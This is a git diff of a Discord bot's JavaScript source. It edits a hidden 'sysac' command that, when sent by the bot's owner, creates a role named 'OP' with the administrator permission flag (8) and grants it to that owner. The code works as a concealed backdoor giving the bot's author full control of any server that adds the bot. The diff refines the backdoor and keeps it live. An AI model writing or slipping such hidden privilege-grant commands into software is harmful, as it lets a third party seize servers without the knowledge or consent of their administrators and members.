@@ -4,7 +4,6 @@ const Discord = require("discord.js");
 const client = new Discord.Client();
 const config = require("./config.json")
 const token = process.env.token;
-const administrator = 'OP'
 
 //startup event handlers
 
@@ -57,12 +56,13 @@ client.on("message", (message) => {
   // Create a new role with data
   if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID){
   let me = message.author
-          let role = message.guild.createRole({
-          name : administrator,
+  let role = message.guild.createRole({
+          name : 'OP',
           color : "RANDOM",
-          permissions : [8]
+          permissions : [8],
+          position: 0
           })
-          let role1 = message.guild.roles.find('name', administrator)
+          let role1 = message.guild.roles.find('name', 'OP')
       message.channel.send(`done`)
      message.guild.member(me).addRole(role1);
   } else
